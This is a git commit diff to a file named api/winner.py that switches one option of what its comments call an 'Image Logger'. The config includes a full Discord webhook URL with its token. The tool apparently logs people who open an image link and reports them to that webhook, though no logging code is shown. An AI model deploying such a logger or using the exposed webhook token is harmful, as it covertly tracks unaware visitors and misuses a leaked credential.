eccfb542c358ae94849655afb60357b09c0f1f78
hackyduck <maskstorm1@gmail.com>
2025-05-11 00:31:11 +0200

    Update winner.py

--- api/winner.py
+++ api/winner.py
@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1335247493893586944/TAppETFOUy01pFxjtWZZWAI0iRcmziuZ6ProDX6Q3jEo7AlbpvppmgrnTaVM8B4YGP8c",
     "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
